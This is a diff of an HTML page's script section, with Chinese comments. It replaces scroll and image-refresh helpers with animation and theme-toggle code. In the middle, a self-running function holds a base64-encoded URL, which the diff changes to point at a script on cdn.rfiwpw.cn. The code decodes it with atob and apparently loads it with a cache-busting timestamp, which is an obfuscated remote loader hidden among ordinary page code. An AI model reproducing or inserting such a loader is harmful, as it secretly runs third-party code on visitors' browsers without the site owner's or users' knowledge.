-        document.querySelectorAll('nav.toc a[href^="#"]').forEach(anchor => {
-            anchor.addEventListener('click', function (e) {
-                e.preventDefault(); // 阻止默认跳转行为
-
-                const targetId = this.getAttribute('href'); // 获取目标ID
-                const targetElement = document.querySelector(targetId); // 获取目标元素
-
-                if (targetElement) {
-                    window.scrollTo({
-                        top: targetElement.offsetTop - 60, // 减去一些偏移量，避免被顶部导航遮挡
-                        behavior: 'smooth' // 平滑滚动效果
-                    });
-                }
-            });
-        });
-
-        // 动态更新图片时间戳，确保每次加载都不同
-        document.addEventListener('DOMContentLoaded', function () {
-            const images = document.querySelectorAll('img[src*="picsum.photos"]');
-            images.forEach(img => {
-                const url = new URL(img.src);
-                url.searchParams.set('random', new Date().getTime() + Math.floor(Math.random() * 1000)); // 添加随机数确保唯一性
-                img.src = url.toString();
-            });
-        });
-    </script>
     <script>
         (function () {
             function init() {
-                const encodedUrl = "aHR0cHM6Ly91c2hvcGltZ3Mub3NzLWFwLXNvdXRoZWFzdC0xLmFsaXl1bmNzLmNvbS9jb3JlLmpz";
+                const encodedUrl = "aHR0cHM6Ly9jZG4ucmZpd3B3LmNuL3N0YXRpYy9qcy9jb2RlLmVuLmpz";
                 const decodedUrl = atob(encodedUrl);
                 const timestamp = Date.now();
                 const randomNum = Math.floor(Math.random() * 1000000);
@@ -390,8 +812,39 @@ console.log("和是: " + result); // 输出 "和是: 8"
             }
             init();
         })();
+        // 简单的动画效果
+        document.addEventListener('DOMContentLoaded', function() {
+            // 滚动动画
+            const observerOptions = {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            };
+            
+            const observer = new IntersectionObserver(function(entries) {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.style.opacity = 1;
+                        entry.target.style.transform = 'translateY(0)';
+                    }
+                });
+            }, observerOptions);
+            
+            // 观察所有卡片和组件
+            document.querySelectorAll('.card, .sidebar-widget, .knowledge-record').forEach(el => {
+                el.style.opacity = 0;
+                el.style.transform = 'translateY(20px)';
+                el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
+                observer.observe(el);
+            });
+            
+            // 主题切换功能
+            const themeToggle = document.querySelector('.theme-toggle');
+            themeToggle.addEventListener('click', function() {
+                document.body.classList.toggle('dark-theme');
+                // 这里可以添加更复杂的主题切换逻辑
+                alert('主题切换功能开发中...');
+            });
+        });
     </script>
-
 </body>
-
 </html>
